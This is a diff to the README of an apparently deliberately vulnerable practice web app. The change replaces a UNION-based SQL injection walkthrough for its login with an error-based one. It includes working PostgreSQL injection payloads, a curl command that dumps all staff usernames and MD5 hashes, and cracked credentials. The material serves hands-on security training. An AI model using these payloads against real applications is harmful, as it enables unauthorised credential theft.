@@ -15,7 +15,7 @@ print raw DB errors, so **UNION-based and error-based** injection both work.
 
 | Page | Query target | Extracts |
 |---|---|---|
-| `htdocs/login.html` + `cgi-bin/login.py` | `wardens` (staff auth) | All staff users (username / email / password_hash) |
+| `htdocs/login.html` + `cgi-bin/login.py` | `wardens` (staff auth) | All staff users via error-based injection (verbose DB errors) |
 | `cgi-bin/admissions.py` | `souls` (public search) | Admissions records; `wardens` via UNION |
 
 Valid login (after cracking the hashes): `charon` / `ferryman`.
@@ -46,29 +46,25 @@ Requires `mod_cgid` loaded in `httpd.conf` so the `.py` CGI scripts execute.
 - Tables: `souls` (public records) and `wardens` (staff creds, md5, crackable).
 - Driver: `python3-psycopg2` (installed by the setup script).
 
-## SQL injection — extract all staff via the login
+## SQL injection — login (error-based)
 
-The login runs:
-`SELECT username, email, role FROM wardens WHERE username = '<user>' AND password_hash = md5('<pass>')`
+The login looks normal: it greets you on success and denies you on failure,
+and **never shows a user table**. But the DB prints raw errors, so you force
+an error that leaks the data. Put this in the **Keeper ID** field (any passphrase):
+```
+' AND 1=CAST((SELECT string_agg(username||':'||password_hash, ', ') FROM wardens) AS int)--
+```
+PostgreSQL throws `invalid input syntax for type integer: "charon:...,"` — every
+user leaked in the error message.
 
-**UNION-based** — put this in the Keeper ID field (any passphrase):
-```
-' UNION SELECT username, email, password_hash FROM wardens --
-```
-All staff rows are reflected in the result table.
-
-**Error-based** — Keeper ID field (any passphrase):
-```
-' AND 1=CAST((SELECT string_agg(username||':'||password_hash, ', ') FROM wardens) AS int) --
-```
-PostgreSQL leaks every user in the error message.
-
-**With curl:**
+With curl:
 ```bash
 curl -s http://localhost/cgi-bin/login.py \
-  --data-urlencode "username=' UNION SELECT username, email, password_hash FROM wardens --" \
+  --data-urlencode "username=' AND 1=CAST((SELECT string_agg(username||':'||password_hash,', ') FROM wardens) AS int)--" \
   --data-urlencode "password=x"
 ```
+
+Valid login (after cracking the hashes): `charon` / `ferryman`.
 
 ## Admissions search (data extraction)
 
